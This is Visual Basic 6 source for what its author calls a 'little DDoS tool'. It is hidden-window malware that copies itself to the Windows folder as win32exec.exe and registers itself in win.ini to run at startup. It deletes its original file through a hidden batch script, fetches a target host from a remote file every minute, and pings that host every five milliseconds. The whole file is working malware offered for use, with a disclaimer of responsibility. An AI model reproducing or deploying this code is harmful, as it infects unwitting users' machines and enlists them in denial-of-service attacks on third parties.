VERSION 5.00
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   750
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   1725
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   750
   ScaleMode       =   0  'User
   ScaleWidth      =   1725
   ShowInTaskbar   =   0   'False
   Visible         =   0   'False
   Begin VB.Timer Timer2 
      Interval        =   5
      Left            =   960
      Top             =   240
   End
   Begin VB.Timer Timer1 
      Interval        =   60000
      Left            =   240
      Top             =   240
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'##################################################################
'    This is a little DDoS tool written by me,-=[brainbuster]=-
'##################################################################
'
'It will add itself to startup (win.ini) and copy itself to %windir%\win32exec.exe
'If its executed the first time it will melt the original - file
'
'So after doing the main "infection" it checks a file on a server u have to specify
'then it starts pinging the server-name listed in the file.
'In the hostfile there must be only one line with the host in it. for exp: www.host.com
'
'Ps: I'm not responsable for anything u do with this ....
'
'HF!
'
'by Brainbuster, brainbuster88@hotmail.com
'#############################################################


Private Declare Function URLDownloadToFile Lib "urlmon" _
  Alias "URLDownloadToFileA" ( _
  ByVal pCaller As Long, _
  ByVal szURL As String, _
  ByVal szFileName As String, _
  ByVal dwReserved As Long, _
  ByVal lpfnCB As Long) As Long


'autostart api
Private Declare Function WriteProfileSection Lib _
  "kernel32" Alias "WriteProfileSectionA" _
  (ByVal lpAppName As String, ByVal lpString As String) _
  As Long
'autostart api
 
Option Explicit


Dim lResult As Long
Dim sURL As String
Dim sLocalFile As String
Private Befehl$
Private MeFile$
Private BatFile$
Private Comment As Boolean
Dim IP
Dim HSTFIL As String
Dim intFile As Integer
Dim strTemp As String
Dim SettingStart As Long
Dim SettingEnd   As Long

Private Declare Function CharToOemA Lib "user32.dll" (ByVal _
        lpszSrc As String, ByVal lpszDst As String) As Long

Private Sub Form_Load()
Dim strOldFile As String
Dim strNewFile As String
Dim pId&
Dim IP
Dim FullAppName
  Dim FileNumber As Integer
    Dim SplitConfig() As String
    Dim ReadString As String
    Dim FileNameConfig As String
    
strOldFile = App.Path & "\" & App.EXEName & ".exe"
strNewFile = Environ$("WINDIR") & "\win32exec.exe"
 
On Error Resume Next

FileNumber = FreeFile
    
    Open App.Path & "\" & App.EXEName & ".exe" For Binary Shared As #FileNumber
        ReadString = Space$(1001)
        Get #FileNumber, LOF(FileNumber) - 1000, ReadString
        SplitConfig = Split(ReadString, "CONFIG")
        HSTFIL = SplitConfig(1)
    Close #FileNumber
    
'##################infect
'copying file and adding win32exec.exe to win.ini - [load]
If App.EXEName = "win32exec" Then GoTo icmpdo
FileCopy strOldFile, strNewFile
SaveAppToWin_ini strNewFile
'##################infect


If App.EXEName = "win32exec" Then GoTo icmpdo

'performing selfdestruction
Shell (Environ$("WINDIR") & "\win32exec.exe")

Selfdestruction

End

icmpdo:

Timer1_Timer
Timer2_Timer

End Sub

Private Sub Selfdestruction()

 Dim ff As Long
 ff = FreeFile


 'avoid spawning  "\\" in name:
 If Len(App.Path) > 3 Then
    MeFile = App.Path & "\" & App.EXEName & ".exe"
    BatFile = App.Path & "\" & "Kill.bat"
 Else '
    MeFile = App.Path & App.EXEName & ".exe"
    BatFile = App.Path & "Kill.bat"
 End If
 
 If GetAttr(MeFile) Then SetAttr MeFile, 0

 'convert Dateiname to ANSI-Code
 Call CharToOemA(MeFile, MeFile)

 
 If Comment Then Befehl = "@echo off" & vbCrLf
 Befehl = Befehl & ":Marke" & vbCrLf
 Befehl = Befehl & "Del " & Chr(34) & MeFile & Chr(34) & vbCrLf
 Befehl = Befehl & "If Exist " & Chr(34) & MeFile & Chr(34) & " Goto Marke" & vbCrLf
 If Comment Then Befehl = Befehl & "echo." & vbCrLf & "echo EXE wurde zerstoert" & vbCrLf & "echo." & vbCrLf
 Befehl = Befehl & "del " & Chr(34) & BatFile & Chr(34)


 'writing kill.bat
 Open BatFile For Binary As #ff
    Put #ff, , Befehl
 Close #ff
 
 If Not Comment Then
    Shell BatFile, vbHide
 Else
    Shell BatFile, vbNormalFocus
 End If

 End

'the selfdestruction function is originally from www.activevb.de

End Sub
'######## write to win.ini function
Public Sub SaveAppToWin_ini(ByVal AppFile As String)
  WriteProfileSection "windows", "load=" & AppFile
End Sub
'######## write to win.ini function

Private Sub Timer1_Timer()



'##################download host to attack
sURL = HSTFIL 'enter the URL of your hostfile here
sLocalFile = Environ$("WINDIR") & "atkhost.hst"

Screen.MousePointer = vbHourglass
lResult = URLDownloadToFile(0, sURL, sLocalFile, 0, 0)
Screen.MousePointer = vbNormal

Open sLocalFile For Input As #1
Line Input #1, IP
Close #1
'##################download host to attack

End Sub

Private Sub Timer2_Timer()
Call Ping(IP)
End Sub

